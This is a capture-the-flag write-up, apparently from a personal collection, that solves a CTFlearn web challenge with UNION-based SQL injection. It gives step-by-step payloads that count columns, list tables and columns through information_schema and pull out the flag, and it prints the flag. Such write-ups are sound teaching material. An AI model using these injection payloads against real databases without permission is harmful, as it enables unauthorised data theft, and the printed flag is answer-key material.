---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

> I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command

![1](https://github.com/Knign/Write-ups/assets/110326359/26c58880-6263-475a-af38-6d87ebf8ed62)

## Determining the number of columns required
- Let's find out how many columns this table has using the `NULL` values.
```
UNION SELECT NULL
UNION SELECT NULL,NULL
UNION SELECT NULL,NULL,NULL
```
- When the number of `NULL` values matches the number of columns, the database returns a proper output.
```
1 UNION SELECT NULL, NULL, NULL, NULL
```

![2](https://github.com/Knign/Write-ups/assets/110326359/84ecfac8-9f9d-4452-a4ad-f65264c4500e)

- So the current table has four columns.
## Finding all tables from the database
- Now we want to find out the other tables so that we can figure out which one might be useful for us.
- For that we can query `information_schema.tables` to list the tables in the database
```
1 UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables
```

![3](https://github.com/Knign/Write-ups/assets/110326359/0cb54e5b-bad9-4ff1-b939-d16a7aa428c9)

```
Useful table: w0w_y0u_f0und_m3
```
## Finding all columns from w0w_y0u_f0und_m3
- In order to find all the columns in the database we have to query `information_schema.columns`.
```
1 UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns
```

![4](https://github.com/Knign/Write-ups/assets/110326359/5bb3157c-7686-4660-a9e8-8034c8d5d29a)

```
Useful column: f0und_m3
```
## Finding the flag
- For the final step, we simply have to modify our query a little bit and select from `w0w_y0u_f0und_m3`.
```
1 UNION SELECT f0und_m3, NULL, NULL, NULL FROM w0w_y0u_f0und_m3
```

![5](https://github.com/Knign/Write-ups/assets/110326359/001e9b82-ab4d-4adb-83a4-c991a81d9cdc)

## Flag
```
CTFlearn{uni0n_1s_4_gr34t_c0mm4nd}
```
